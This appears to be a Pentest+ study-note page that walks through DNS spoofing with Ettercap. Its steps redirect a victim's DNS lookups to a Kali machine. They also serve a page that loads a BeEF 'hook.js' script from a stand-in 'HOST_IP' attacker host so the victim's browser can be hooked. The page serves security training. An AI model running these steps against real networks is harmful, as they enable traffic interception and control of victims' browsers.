### DNS Spoofing
* An attack method used to impersonate a victim's DNS server, forcing them to navigate to a malicious website.
* This attack is accomplished through MitM (Man in The Middle).
* The goal is to exploit the target with a malicious redirect or steal sensitive information from a fake web page.

### DNS Cache Poisoning
* The DNS resolver cache is overwritten on the DNS server with a malicious web address, and the user will receive the malicious site instead of the intended one.

**Use Ettercap in Kali to conduct these attacks**

## Ettercap DNS

### 1) Modify the etter.dns file
* Location: /etc/ettercap/etter.dns
* Add an entry to the file for the domain name example.com and have it point to your kali box.
* Look for the line "microsoft sucks ;) on line 57

### 2) Edit etter.conf file
* Location: /etc/ettercap/etter.conf
* Change two config settings: ec_uid and ec_gid. Set both to equal 0.
* Save and exit the file.

### 3) Create index.html
* Create an index.html in /tmp. The code to input is below
````
<html>
      <h1>You got pwnd!!</h1>
      <script src='http://HOST_IP:3000/hook.js'></script>
</html>
````

* Use the Python SimpleHTTPServer module to host the web page on port 80
````
python -m SimpleHTTPServer 80
````

### 4) Launch BeEf
````
beef-xss
````

### 5) Launch Ettercap
````
ettercap -G
````
* "Sniffing at startup" should be selected automatically.
![](https://github.com/azul-007/Certification-Notes/blob/master/Pentest%2B/Ch7_Network_Based_Attacks/images/5_ettercap.png)

### 6) Select the checkmark in the upper right corner to start sniffing

### 7) List the hosts Ettercap has discovered
* Select the vertical elipses in the upper right hand corner.
* Select Hosts > Hosts list
![](https://github.com/azul-007/Certification-Notes/blob/master/Pentest%2B/Ch7_Network_Based_Attacks/images/7_list_hosts.png)

### 8) Select hosts
* Identify and select Target 1 as the target host to redirect.
![](https://github.com/azul-007/Certification-Notes/blob/master/Pentest%2B/Ch7_Network_Based_Attacks/images/8_target1_host.png)

* Select Target 2 as the gateway/DNS server to impersonate. 
![](https://github.com/azul-007/Certification-Notes/blob/master/Pentest%2B/Ch7_Network_Based_Attacks/images/8_target2_host.png)
